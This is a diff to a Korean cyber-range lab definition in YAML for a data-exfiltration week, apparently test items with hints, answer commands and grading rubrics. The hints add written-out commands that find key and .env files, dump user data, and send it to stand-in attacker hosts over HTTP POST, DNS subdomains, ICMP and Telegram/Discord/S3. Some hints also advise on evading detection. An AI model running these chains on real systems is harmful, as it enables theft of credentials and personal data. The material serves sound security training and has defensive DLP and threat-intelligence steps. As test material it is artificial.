@@ -16,7 +16,22 @@ steps:
 - order: 1
   instruction: web 서버에서 민감한 데이터가 포함된 파일을 식별하라. /etc, /home, /var/www에서 설정 파일과 데이터
     파일을 검색하라.
-  hint: find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다
+  hint: |
+    find 명령으로 .conf, .env, .key, .pem 등의 파일을 검색한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf" -o -name "*.env" -o -name "*.key" -o -name "*.pem" -o -name "*.sql" \) 2>/dev/null | head -20'
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - locate *.env (mlocate db)
+       - LinPEAS files 섹션
+       - linenum.sh
+       - linux-smart-enumeration
+       - trufflehog filesystem (시크릿 정밀)
+       - gitleaks (git 이력)
+       - find -size 단위 + grep
+       - rga (ripgrep-all 콘텐츠 검색)
+    4) 검증: T1005 Data from Local + T1083 File Discovery.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'find /etc /home /var/www -type f \( -name "*.conf"
@@ -38,9 +53,14 @@ steps:
       - 민감 디렉터리 3곳 (/etc/home/var/www)
       - 파일 경로 출력
       acceptable_methods:
-      - find -name 확장자
-      - LinPEAS files 섹션
-      - locate *.env
+      - "find + 확장자 필터 (수기 baseline)."
+      - "locate *.env."
+      - "LinPEAS files."
+      - "linenum.sh."
+      - "linux-smart-enumeration."
+      - "trufflehog filesystem."
+      - "gitleaks."
+      - "rga ripgrep-all."
       negative_signs:
       - 확장자 필터 없음
       - 단일 디렉터리만
@@ -48,7 +68,22 @@ steps:
   target_vm: attacker
 - order: 2
   instruction: JuiceShop에서 SQL Injection을 통해 사용자 데이터를 추출하고, 결과를 파일로 저장하라.
-  hint: 이전 week에서 배운 SQLi 기법으로 사용자 정보를 추출한다
+  hint: |
+    이전 week에서 배운 SQLi 기법으로 사용자 정보를 추출한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -s http://10.20.30.80:3000/api/Users | python3 -c "..." > /tmp/exfil_users.csv && wc -l + head
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - sqlmap --dump
+       - Burp Intruder bulk extract
+       - jq -r 변환
+       - mysqldump (DB 직접)
+       - pg_dump (PostgreSQL)
+       - mongoexport (NoSQL)
+       - Nemesida WAF 우회
+       - DBeaver / Navicat GUI export
+    4) 검증: T1005 + T1213 + OWASP API2:2023.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -74,9 +109,14 @@ steps:
       - CSV 저장 + Extracted users 키워드
       - wc -l로 추출 건수 검증
       acceptable_methods:
-      - curl + jq/python 파싱
-      - sqlmap --dump
-      - Burp Intruder
+      - "curl + jq/python 파싱 (수기 baseline)."
+      - "sqlmap --dump."
+      - "Burp Intruder bulk extract."
+      - "jq -r 변환."
+      - "mysqldump (직접)."
+      - "pg_dump."
+      - "mongoexport (NoSQL)."
+      - "DBeaver / Navicat export."
       negative_signs:
       - API 호출 없음
       - CSV 저장 없음
@@ -84,7 +124,22 @@ steps:
   target_vm: attacker
 - order: 3
   instruction: 추출한 데이터를 Base64로 인코딩하여 전송 준비를 하라.
-  hint: base64 명령으로 파일을 인코딩한다
+  hint: |
+    base64 명령으로 파일을 인코딩한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && wc -c 비교
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - base32 (DNS 친화적, 32% ↑)
+       - base85 / Ascii85 (작음)
+       - openssl base64 -e
+       - python3 base64.b64encode
+       - perl encode_base64
+       - hex (xxd -p)
+       - URL-safe base64 (-base64url)
+       - Bastion AI 인코딩 audit
+    4) 검증: T1132.001 Standard Encoding.
   category: exploit
   points: 10
   answer: base64 /tmp/exfil_users.csv > /tmp/exfil_encoded.txt && echo 'Original size:'
@@ -105,9 +160,14 @@ steps:
       - Original size + Encoded size 비교
       - 인코딩 파일 생성
       acceptable_methods:
-      - base64 명령
-      - openssl base64
-      - python3 base64
+      - "base64 인코딩 + wc -c 비교 (수기 baseline)."
+      - "base32 DNS 친화적."
+      - "base85 / Ascii85."
+      - "openssl base64 -e."
+      - "python3 base64.b64encode."
+      - "perl encode_base64."
+      - "xxd -p hex."
+      - "URL-safe base64."
       negative_signs:
       - 인코딩 없음
       - 크기 비교 없음
@@ -115,7 +175,22 @@ steps:
   target_vm: attacker
 - order: 4
   instruction: HTTP POST 요청을 통한 데이터 유출을 시뮬레이션하라. curl로 인코딩된 데이터를 외부 서버에 전송하는 방법을 시연하라.
-  hint: curl -X POST -d @파일 형태로 데이터를 전송한다
+  hint: |
+    curl -X POST -d @파일 형태로 데이터를 전송한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -X POST -d @/tmp/exfil_encoded.txt http://attacker_ip:8080/upload
+    2) 미설치: sudo apt install -y curl
+    3) 실패/대안:
+       - wget --post-file=
+       - python3 requests.post
+       - httpie POST @file
+       - netcat (raw HTTP)
+       - aria2c -d 데이터 분할
+       - axel (멀티 connection)
+       - rclone (cloud sync)
+       - pastebinit (CLI pastebin)
+    4) 검증: T1041 Exfiltration over C2 Channel. HTTPS 권장.
   category: exploit
   points: 10
   answer: 'echo ''=== HTTP Exfiltration Simulation ==='' && echo ''Method: curl -X
@@ -139,9 +214,14 @@ steps:
       - curl -X POST -d @파일 형태
       - JSON/헤더 위장 예시
       acceptable_methods:
-      - curl POST + JSON 위장
-      - pastebin/Telegram/Discord webhook
-      - cloud storage API (S3/GDrive)
+      - "curl POST + JSON 위장 (수기 baseline)."
+      - "wget --post-file=."
+      - "python3 requests.post."
+      - "httpie POST @file."
+      - "pastebin/Telegram/Discord webhook."
+      - "cloud storage API (S3/GDrive/Dropbox)."
+      - "rclone."
+      - "Bastion AI exfil 시뮬 audit."
       negative_signs:
       - POST 예시 없음
       - 위장 기법 없음
@@ -149,7 +229,22 @@ steps:
   target_vm: attacker
 - order: 5
   instruction: DNS 터널링을 통한 데이터 유출의 원리를 이해하라. 데이터를 DNS 쿼리의 서브도메인으로 인코딩하는 방법을 시연하라.
-  hint: 데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다
+  hint: |
+    데이터를 hex/base32로 인코딩하여 DNS 쿼리에 포함한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo 'data' | xxd -p | head -c 50 + dig $(...).attacker.com
+    2) 미설치: sudo apt install -y dnsutils xxd
+    3) 실패/대안:
+       - DNScat2 (전문 DNS C2)
+       - dnsteal (Python 도구)
+       - iodine (IPv4 over DNS)
+       - dnsdumpster + 자작 스크립트
+       - Cobalt Strike DNS beacon
+       - Empire DNS C2
+       - dnscat 자동화
+       - DNS-over-HTTPS (DoH) 회피
+    4) 검증: T1071.004 DNS C2 + T1048.003 Exfil DNS.
   category: exploit
   points: 10
   answer: 'DATA=''sensitive_data''; ENCODED=$(echo -n $DATA | xxd -p); echo ''===
@@ -172,9 +267,14 @@ steps:
       - xxd/base32 인코딩 + 서브도메인
       - iodine/dnscat2 도구 언급
       acceptable_methods:
-      - dig + 서브도메인 인코딩
-      - iodine IP-over-DNS
-      - dnscat2 C2
+      - "xxd + dig 서브도메인 (수기 baseline)."
+      - "DNScat2 전문 C2."
+      - "dnsteal (Python)."
+      - "iodine IP-over-DNS."
+      - "Cobalt Strike DNS beacon."
+      - "Empire DNS C2."
+      - "DoH 회피."
+      - "Bastion AI DNS exfil audit."
       negative_signs:
       - DNS 쿼리 구성 없음
       - 인코딩 생략
@@ -182,7 +282,22 @@ steps:
   target_vm: attacker
 - order: 6
   instruction: ICMP 터널링의 원리를 이해하기 위해 ping 패킷에 커스텀 데이터를 포함하여 전송하라.
-  hint: ping -p 옵션으로 패턴 데이터를 지정할 수 있다
+  hint: |
+    ping -p 옵션으로 패턴 데이터를 지정할 수 있다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ping -c 3 -p 4142434445 attacker_ip (hex 패턴)
+    2) 미설치: sudo apt install -y iputils-ping
+    3) 실패/대안:
+       - hping3 -1 -E file -d size (file payload)
+       - icmptunnel (Linux ICMP C2)
+       - icmpsh (Windows backdoor)
+       - PingPyte (Python)
+       - scapy IP/ICMP/Raw payload
+       - skydog (ICMP TUN tunnel)
+       - prism (ICMP shell)
+       - Bastion AI ICMP exfil audit
+    4) 검증: T1095 Non-Application Layer Protocol. ICMP 종종 허용.
   category: exploit
   points: 10
   answer: 'echo ''=== ICMP Tunneling ==='' && echo ''Using ping -p to embed data in
@@ -207,9 +322,14 @@ steps:
       - ping -p 패턴 사용
       - ICMP 도구 (icmpsh/ptunnel) 언급
       acceptable_methods:
-      - ping -p hex
-      - icmpsh/ptunnel/icmptunnel
-      - hping3 ICMP 페이로드
+      - "ping -p hex 패턴 (수기 baseline)."
+      - "hping3 -1 -E file."
+      - "icmptunnel (Linux ICMP C2)."
+      - "icmpsh."
+      - "PingPyte (Python)."
+      - "scapy IP/ICMP/Raw."
+      - "skydog (ICMP TUN)."
+      - "prism (ICMP shell)."
       negative_signs:
       - ping -p 없음
       - ICMP 페이로드 맥락 없음
@@ -217,7 +337,22 @@ steps:
   target_vm: attacker
 - order: 7
   instruction: 데이터를 암호화하여 유출하는 방법을 시연하라. openssl로 AES-256 암호화를 적용하라.
-  hint: openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다
+  hint: |
+    openssl enc -aes-256-cbc 옵션으로 파일을 암호화한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: openssl enc -aes-256-cbc -salt -pbkdf2 -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin -k secretpassword
+    2) 미설치: sudo apt install -y openssl
+    3) 실패/대안:
+       - gpg --symmetric --cipher-algo AES256
+       - 7z a -p<pw> -mhe=on (헤더 암호화)
+       - age (modern, age-encryption.org)
+       - rage (Rust impl of age)
+       - python cryptography Fernet
+       - openssl enc -chacha20
+       - veracrypt (volume)
+       - cryptsetup luks (block device)
+    4) 검증: T1027 + T1573 Encrypted Channel.
   category: exploit
   points: 10
   answer: 'openssl enc -aes-256-cbc -salt -in /tmp/exfil_users.csv -out /tmp/exfil_encrypted.bin
@@ -240,9 +375,14 @@ steps:
       - Encrypted file 키워드 + file 명령 검증
       - 복호화 역과정 설명
       acceptable_methods:
-      - openssl enc AES-256
-      - gpg --symmetric
-      - age 암호화
+      - "openssl enc AES-256-CBC + pbkdf2 (수기 baseline)."
+      - "gpg --symmetric --cipher-algo AES256."
+      - "7z a -p -mhe=on."
+      - "age modern."
+      - "rage (Rust impl)."
+      - "python cryptography Fernet."
+      - "openssl enc -chacha20."
+      - "veracrypt volume."
       negative_signs:
       - 암호화 명령 없음
       - 키 파생 (-pbkdf2) 없음
@@ -250,9 +390,22 @@ steps:
   target_vm: attacker
 - order: 8
   instruction: 데이터를 작은 청크로 분할하여 시간을 두고 유출하는 Low-and-Slow 기법을 시연하라.
-  hint: split 명령으로 파일을 분할하고 순차 전송을 시뮬레이션한다
-  category: exploit
-  points: 10
+  hint: |
+    split 명령으로 파일을 분할하고 순차 전송을 시뮬레이션한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: split -b 1K /tmp/exfil_users.csv /tmp/chunk_ && for f in /tmp/chunk_*; do echo "Send: $f"; sleep 1; done
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - dd bs=1K count=1 (정밀 청크)
+       - tar --tape-length= 분할
+       - csplit 컨텐츠 기반
+       - python file chunking + sleep
+       - awk -v RS 분할
+       - rsync --bwlimit (대역 제한)
+       - aria2c --max-overall-download-limit
+       - Bastion AI low-and-slow scheduler
+    4) 검증: T1029 Scheduled Transfer + T1030 Data Transfer
   answer: split -b 50 /tmp/exfil_users.csv /tmp/chunk_ && echo 'Chunks created:' &&
     ls -la /tmp/chunk_* && echo '---' && echo 'Low-and-slow exfil simulation:' &&
     for f in /tmp/chunk_*; do echo "Sending $(basename $f) ($(wc -c < $f) bytes) at
@@ -272,9 +425,14 @@ steps:
       - Chunks created + 다중 청크 파일
       - 시간 분산 전송 시뮬
       acceptable_methods:
-      - split -b 바이트 단위
-      - dd bs=N count=N + 루프
-      - Python chunked POST
+      - "split -b 50 source chunk_ + 루프 sleep (수기 baseline)."
+      - "dd bs=1K count=1 skip=N (정밀 오프셋 청크)."
+      - "tar --tape-length=K -F next.sh (다중 볼륨 분할)."
+      - "csplit -k -n 3 file '/PATTERN/' '{*}' (컨텐츠 경계 분할)."
+      - "python3 file.read(N) + time.sleep(jitter) (랜덤 jitter low-and-slow)."
+      - "awk -v RS='---' (레코드 단위 분할)."
+      - "rsync --bwlimit=10K (전송 시 대역 제한)."
+      - "aria2c --max-overall-download-limit=64K (스케줄/대역 양면)."
       negative_signs:
       - split 없음
       - 단일 전송 (low-and-slow 부재)
@@ -282,7 +440,22 @@ steps:
   target_vm: attacker
 - order: 9
   instruction: 스테가노그래피를 사용하여 이미지 파일에 데이터를 숨기는 기법을 시연하라.
-  hint: steghide 또는 단순히 cat으로 파일을 결합한다
+  hint: |
+    steghide/openstego 같은 전용 도구가 없으면 cat 으로 cover 뒤에 secret 을 append 하고 tail -c 로 추출한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: dd if=/dev/urandom bs=1024 count=10 of=/tmp/fake_image.jpg && cat /tmp/fake_image.jpg /tmp/secret.txt > /tmp/stego_image.jpg && wc -c /tmp/stego_image.jpg && tail -c 50 /tmp/stego_image.jpg
+    2) 미설치: sudo apt install -y steghide (passphrase 기반) / outguess / coreutils 만으로도 cat 가능
+    3) 실패/대안:
+       - steghide embed -cf cover.jpg -ef secret.txt -p PASS (JPEG DCT)
+       - openstego embed -mf secret -cf cover.png -sf out.png (BMP/PNG LSB)
+       - snow -C -m "$(cat secret)" cover.txt out.txt (공백/탭 인코딩)
+       - F5 / OutGuess (JPEG DCT 통계 회피)
+       - StegoSuite (Java GUI, JPEG/BMP/PNG/GIF)
+       - zsteg (PNG/BMP LSB 분석·삽입)
+       - exiftool -Comment="secret" cover.jpg (메타데이터 채널)
+       - binwalk -e (포렌식 detect용 — Blue Team)
+    4) 검증: T1027.003 Steganography. 분석 도구: binwalk + stegdetect + zsteg + exiftool + chi-square test.
   category: exploit
   points: 10
   answer: 'echo ''SECRET_DATA:admin@juice-sh.op:password123'' > /tmp/secret.txt &&
@@ -307,9 +480,14 @@ steps:
       - 이미지+secret 결합 + 크기 비교
       - 추출 방법 (tail -c) 설명
       acceptable_methods:
-      - cat 결합 (단순)
-      - steghide embed -ef secret -cf cover
-      - openstego/snow
+      - "cat cover secret > stego + tail -c 추출 (수기 baseline, 단순 append)."
+      - "steghide embed -cf cover.jpg -ef secret -p PASS (JPEG DCT 계수 LSB)."
+      - "openstego embed -mf secret -cf cover.png -sf out.png (BMP/PNG LSB GUI/CLI)."
+      - "snow -C -m \"text\" cover.txt out.txt (공백·탭 화이트스페이스 인코딩)."
+      - "outguess -k key -d secret cover.jpg out.jpg (JPEG 통계 보정)."
+      - "F5 stego (JPEG DCT 빈도 보존)."
+      - "exiftool -Comment=\"$(base64 secret)\" cover.jpg (메타데이터 채널)."
+      - "zsteg / stegoSuite (PNG·BMP LSB 자동화)."
       negative_signs:
       - 은닉 명령 없음
       - 추출 방법 없음
@@ -318,9 +496,22 @@ steps:
 - order: 10
   instruction: curl을 사용하여 클라우드 서비스를 통한 유출을 시뮬레이션하라. pastebin 형태의 서비스로 데이터를 전송하는 명령을
     작성하라.
-  hint: curl로 REST API에 데이터를 POST한다
-  category: exploit
-  points: 10
+  hint: |
+    pastebin/Telegram/Discord 등 *정상 도메인 + HTTPS* 채널을 경유하면 도메인 평판·콘텐츠 검사 양면 회피된다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -X POST -d "api_paste_code=@/tmp/exfil_encoded.txt" https://pastebin.com/api/api_post.php (실 전송 X — 시뮬 echo)
+    2) 미설치: sudo apt install -y curl jq
+    3) 실패/대안:
+       - curl -F "document=@file" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID> (Telegram bot)
+       - curl -F "file=@/tmp/data.zip" https://discord.com/api/webhooks/<ID>/<TOKEN> (Discord webhook)
+       - curl -F "files[file]=@" https://slack.com/api/files.upload (Slack)
+       - rclone copy file gdrive:/exfil/ (Google Drive 토큰 인증)
+       - aws s3 cp file s3://attacker-bucket/ (S3 IAM key)
+       - github gist push via gh api gists -F (코드 저장소 채널)
+       - dropbox-uploader.sh upload file /exfil/ (Dropbox)
+       - mega-put file /Root/exfil/ (MEGA)
+    4) 검증: T1567.002 Cloud Storage + T1567.001 Code Repository + T1567.003 Text Storage. SSL 인터셉션 + 도메인 카테고리 차단 필요.
   answer: 'echo ''=== Cloud Service Exfiltration ==='' && echo ''Pastebin: curl -X
     POST -d "api_paste_code=$(cat /tmp/exfil_encoded.txt)" https://pastebin.com/api/api_post.php''
     && echo ''Telegram: curl -F "document=@/tmp/exfil_encrypted.bin" https://api.telegram.org/bot<TOKEN>/sendDocument?chat_id=<ID>''
@@ -342,9 +533,14 @@ steps:
       - pastebin/Telegram/Discord 등 2개 이상
       - 탐지 한계 (SSL inspection 등) 언급
       acceptable_methods:
-      - pastebin API
-      - Telegram Bot sendDocument
-      - Discord webhook / Slack incoming-webhook / GDrive API
+      - "pastebin api_post.php POST (수기 baseline, 텍스트 채널)."
+      - "Telegram Bot sendDocument multipart -F."
+      - "Discord webhook -F file=@ multipart."
+      - "Slack files.upload (token bearer)."
+      - "rclone copy → Google Drive / Dropbox (OAuth 토큰)."
+      - "aws s3 cp / mc (MinIO) — 클라우드 객체 스토리지 직업로드."
+      - "gh api gists / github gist push (코드 저장소 채널)."
+      - "MEGA / mega-put / pCloud CLI (E2E 암호화 채널)."
       negative_signs:
       - 클라우드 서비스 없음
       - 단일 채널만
@@ -352,7 +548,22 @@ steps:
   target_vm: attacker
 - order: 11
   instruction: tar와 gzip으로 수집한 데이터를 아카이브하고 압축하라. 전송 크기를 최소화하라.
-  hint: tar czf 명령으로 압축 아카이브를 생성한다
+  hint: |
+    수집 자료를 단일 아카이브로 묶어 압축하면 전송 시간/볼륨이 90% 이상 감소해 볼륨 기반 탐지 회피에 유리하다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt && ls -lh /tmp/exfil_archive.tar.gz && du -ch /tmp/exfil_users.csv /tmp/exfil_encoded.txt | tail -1
+    2) 미설치: sudo apt install -y tar gzip xz-utils zstd p7zip-full
+    3) 실패/대안:
+       - tar cJf out.tar.xz src/ (xz LZMA2, 강한 압축률)
+       - tar c src/ | zstd -19 -o out.tar.zst (zstd, 빠른 + 작은)
+       - 7z a -t7z -mx9 -mhe=on out.7z src/ (헤더 암호화 결합)
+       - zip -r -9 out.zip src/ (Windows 호환)
+       - tar c src/ | gzip -9 | openssl enc -aes-256-cbc -pbkdf2 (압축+암호 파이프)
+       - rar a -ed -rr5% out.rar src/ (recovery record)
+       - cpio -ovH crc | gzip (Linux 보안 인프라 친화)
+       - Bastion AI archive scheduler (chunk + 비동기)
+    4) 검증: T1560.001 Archive via Utility + T1560.003 Custom Method. 텍스트 90%+ 압축, 압축 후 암호화 결합 시 콘텐츠+볼륨 양면 회피.
   category: exploit
   points: 10
   answer: tar czf /tmp/exfil_archive.tar.gz /tmp/exfil_users.csv /tmp/exfil_encoded.txt
@@ -448,7 +659,12 @@ steps:
       - 단순 문자열 출력
   target_vm: attacker
 - order: 14
-  instruction: 데이터 유출 방지(DLP)를 위한 nftables 방화벽 규칙을 작성하라. 대용량 아웃바운드 전송을 제한하는 규칙을 설계하라.
+  instruction: '데이터 유출 방지(DLP)를 위한 nftables 방화벽 규칙을 작성하라. 대용량 아웃바운드 전송을 제한하는 규칙을 설계하라.
+
+
+    [FIXTURE] /home/ccc/cyber-range/fixtures/attack-nonai-week11/14/syslog 사전 주입.
+    `grep -E ''DROP|REJECT|filter'' /home/ccc/cyber-range/fixtures/attack-nonai-week11/14/syslog`
+    후 (1) 빈도·패턴 (2) MITRE (3) 방어 3섹션 분석. **raw dump 금지**.'
   hint: nftables의 ct bytes 매처를 사용하여 연결당 전송량을 제한한다
   category: analysis
   points: 15
@@ -483,6 +699,18 @@ steps:
       - egress 관점 없음
       - 임계치 없음
   target_vm: attacker
+  fixtures:
+  - generator: firewall_log
+    target_vm: attacker
+    path: /home/ccc/cyber-range/fixtures/attack-nonai-week11/14/syslog
+    params:
+      seed: 42
+      duration_days: 7
+      scan_bursts: 5
+      egress_violations: 20
+      syn_flood_count: 200
+    mode: overwrite
+    cleanup: false
 - order: 15
   instruction: 데이터 유출 실습 결과를 /tmp/exfiltration_report.txt에 정리하라. 유출 채널, 기법, 탐지/방어
     방안을 포함하라.
@@ -525,63 +753,54 @@ steps:
       - Detection/방어 없음
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "백신회사 위협 인텔리전스 분석가 — APT Dossier (Diamond Model + STIX IoC)"
+  instruction: "[복합 시나리오] \"백신회사 위협 인텔리전스 분석가 — APT Dossier (Diamond Model + STIX\
+    \ IoC)\"\n\n## 상황 — 신규 캠페인 발견, 분석 dossier\n\n당신은 *Vaccino* CTI Lead 7년차. 협력사 SOC\
+    \ 가 비정상 데이터 유출 패턴 5건 신고.\n3일 내 Diamond Model + STIX 2.1 IoC bundle 작성. 결과물 FS-ISAC\
+    \ 공유.\n\n> [협력사 SOC head] \"DNS 평소 50바이트, 어제 새벽 200~250바이트 폭증. Suricata 안 떠.\n\
+    ※ 누가·뭘·다음에 뭐 올지 분석 부탁.\"\n\n학습 목표 (lecture #2 SUID/sudo + #5 커널 CVE) + (lab #1·#2·#5·#7·#9\
+    \ 식별/SQLi/DNS/AES/스테가) 통합.\n\n## 산출물 — 4 파트 dossier\n\nNon-AI 트랙: ssh ccc@10.20.30.201\
+    \ (attacker VM) 직접 실행.\n\n### Part 1 — Diamond Model 4 vertices\nAdversary (APT-X\
+    \ cluster, cyber crime / state-aligned) ↔ Capability (T1048.003 DNS exfil + T1027\
+    \ obfuscation\n+ T1029 scheduled + T1071.004 DNS C2 + T1001.002 stego) ↔ Infrastructure\
+    \ (ns1.evil.tld, .info/.top DGA,\npastebin clone) ↔ Victim (금융권 핀테크, 사용자 DB, 5,000\
+    \ PII).\n\n### Part 2 — 5 exfil PoC\n1) HTTP+base64 (T1041): `echo \"user1:hash1,user2:hash2\"\
+    \ | base64 -w0 > /tmp/loot.b64; wc -c /tmp/loot.b64`\n   `echo \"[POC] curl -X\
+    \ POST -d @/tmp/loot.b64 https://attacker/upload (실 전송 X)\"`\n2) DNS 터널 (T1048.003):\n\
+    \   `python3 -c \"import base64; data=open('/tmp/loot.b64').read().strip(); ch=[data[i:i+50]\
+    \ for i in range(0,min(len(data),200),50)]; [print(c+'.evil.tld') for c in ch[:4]]\"\
+    `\n3) AES-256 (T1027): `echo \"secret-token\" | openssl enc -aes-256-cbc -pbkdf2\
+    \ -pass pass:DEMO123 -base64 2>/dev/null | head -3`\n4) Low-Slow (T1029): `for\
+    \ i in 1 2 3; do echo \"chunk $i sent at $(date +%H:%M:%S) (실 전송 X)\"; done`\n\
+    5) Stego (T1001.002): `echo \"[POC] steghide embed -cf cover.jpg -ef secret -p\
+    \ DEMO -sf out.jpg (실 X)\"`\n\n### Part 3 — STIX 2.1 bundle (4 indicator)\n`cat\
+    \ <<'EOF'\n{\n  \"type\": \"bundle\",\n  \"id\": \"bundle--apt-x-2026-04-29\"\
+    ,\n  \"objects\": [\n    {\"type\":\"indicator\",\"id\":\"indicator--apt-x-dns-1\"\
+    ,\"pattern\":\"[domain-name:value MATCHES '^[a-zA-Z0-9+/=]{40,}\\\\.evil\\\\.tld$']\"\
+    ,\"pattern_type\":\"stix\",\"valid_from\":\"2026-04-29T00:00:00Z\",\"labels\"\
+    :[\"malicious-activity\"],\"name\":\"APT-X DNS exfil\"},\n    {\"type\":\"indicator\"\
+    ,\"id\":\"indicator--apt-x-c2-2\",\"pattern\":\"[ipv4-addr:value = '203.0.113.99']\"\
+    ,\"pattern_type\":\"stix\",\"valid_from\":\"2026-04-29T00:00:00Z\",\"labels\"\
+    :[\"malicious-activity\"],\"name\":\"APT-X C2 IP\"},\n    {\"type\":\"indicator\"\
+    ,\"id\":\"indicator--apt-x-stego-3\",\"pattern\":\"[file:hashes.'SHA-256' = 'b5e3...']\"\
+    ,\"pattern_type\":\"stix\",\"valid_from\":\"2026-04-29T00:00:00Z\",\"labels\"\
+    :[\"malicious-activity\"],\"name\":\"APT-X stego template\"},\n    {\"type\":\"\
+    indicator\",\"id\":\"indicator--apt-x-aes-4\",\"pattern\":\"[file:content_ref.payload_bin\
+    \ MATCHES 'Salted__']\",\"pattern_type\":\"stix\",\"valid_from\":\"2026-04-29T00:00:00Z\"\
+    ,\"labels\":[\"malicious-activity\"],\"name\":\"OpenSSL AES magic\"}\n  ]\n}\n\
+    EOF`\n\n### Part 4 — ISAC 공유 권고 3\n1. DNS 쿼리 길이 100바이트 임계 → Wazuh 룰 100500 (60일\
+    \ hot)\n2. egress :443 non-CDN flow-rate >10MB/min alert\n3. JPEG/PNG 업로드 metadata\
+    \ stripping (DLP CT-INSPECT)\n\n종료: echo \"=== APT-X Dossier ===\" + 4 파트 모두.\n"
+  hint: 'Part 1 Diamond 4 vertices + ATT&CK 매핑.
 
-    ## 상황 — 신규 캠페인 발견, 분석 dossier
-
-    당신은 *Vaccino* CTI Lead 7년차. 협력사 SOC 가 비정상 데이터 유출 패턴 5건 신고.
-    3일 내 Diamond Model + STIX 2.1 IoC bundle 작성. 결과물 FS-ISAC 공유.
-
-    > [협력사 SOC head] "DNS 평소 50바이트, 어제 새벽 200~250바이트 폭증. Suricata 안 떠.
-    > 누가·뭘·다음에 뭐 올지 분석 부탁."
-
-    학습 목표 (lecture #2 SUID/sudo + #5 커널 CVE) + (lab #1·#2·#5·#7·#9 식별/SQLi/DNS/AES/스테가) 통합.
-
-    ## 산출물 — 4 파트 dossier
-
-    Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
-
-    ### Part 1 — Diamond Model 4 vertices
-    Adversary (APT-X cluster, cyber crime / state-aligned) ↔ Capability (T1048.003 DNS exfil + T1027 obfuscation
-    + T1029 scheduled + T1071.004 DNS C2 + T1001.002 stego) ↔ Infrastructure (ns1.evil.tld, .info/.top DGA,
-    pastebin clone) ↔ Victim (금융권 핀테크, 사용자 DB, 5,000 PII).
-
-    ### Part 2 — 5 exfil PoC
-    1) HTTP+base64 (T1041): `echo "user1:hash1,user2:hash2" | base64 -w0 > /tmp/loot.b64; wc -c /tmp/loot.b64`
-       `echo "[POC] curl -X POST -d @/tmp/loot.b64 https://attacker/upload (실 전송 X)"`
-    2) DNS 터널 (T1048.003):
-       `python3 -c "import base64; data=open('/tmp/loot.b64').read().strip(); ch=[data[i:i+50] for i in range(0,min(len(data),200),50)]; [print(c+'.evil.tld') for c in ch[:4]]"`
-    3) AES-256 (T1027): `echo "secret-token" | openssl enc -aes-256-cbc -pbkdf2 -pass pass:DEMO123 -base64 2>/dev/null | head -3`
-    4) Low-Slow (T1029): `for i in 1 2 3; do echo "chunk $i sent at $(date +%H:%M:%S) (실 전송 X)"; done`
-    5) Stego (T1001.002): `echo "[POC] steghide embed -cf cover.jpg -ef secret -p DEMO -sf out.jpg (실 X)"`
-
-    ### Part 3 — STIX 2.1 bundle (4 indicator)
-    `cat <<'EOF'
-    {
-      "type": "bundle",
-      "id": "bundle--apt-x-2026-04-29",
-      "objects": [
-        {"type":"indicator","id":"indicator--apt-x-dns-1","pattern":"[domain-name:value MATCHES '^[a-zA-Z0-9+/=]{40,}\\.evil\\.tld$']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X DNS exfil"},
-        {"type":"indicator","id":"indicator--apt-x-c2-2","pattern":"[ipv4-addr:value = '203.0.113.99']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X C2 IP"},
-        {"type":"indicator","id":"indicator--apt-x-stego-3","pattern":"[file:hashes.'SHA-256' = 'b5e3...']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"APT-X stego template"},
-        {"type":"indicator","id":"indicator--apt-x-aes-4","pattern":"[file:content_ref.payload_bin MATCHES 'Salted__']","pattern_type":"stix","valid_from":"2026-04-29T00:00:00Z","labels":["malicious-activity"],"name":"OpenSSL AES magic"}
-      ]
-    }
-    EOF`
-
-    ### Part 4 — ISAC 공유 권고 3
-    1. DNS 쿼리 길이 100바이트 임계 → Wazuh 룰 100500 (60일 hot)
-    2. egress :443 non-CDN flow-rate >10MB/min alert
-    3. JPEG/PNG 업로드 metadata stripping (DLP CT-INSPECT)
-
-    종료: echo "=== APT-X Dossier ===" + 4 파트 모두.
-  hint: |
-    Part 1 Diamond 4 vertices + ATT&CK 매핑.
     Part 2 5 exfil PoC (POC 텍스트, 실 전송 X).
+
     Part 3 STIX 2.1 bundle JSON (4 indicator).
+
     Part 4 ISAC 권고 3.
+
     포인트: CTI dossier — Diamond + STIX 양식.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -589,10 +808,14 @@ steps:
     expect: Dossier
     field: stdout
     semantic:
-      intent: |
-        위협 인텔 분석가 페르소나 — APT-X dossier:
-        Diamond Model 4 vertices + 5 exfil PoC + STIX 2.1 bundle 4 indicator + ISAC 권고 3.
+      intent: '위협 인텔 분석가 페르소나 — APT-X dossier:
+
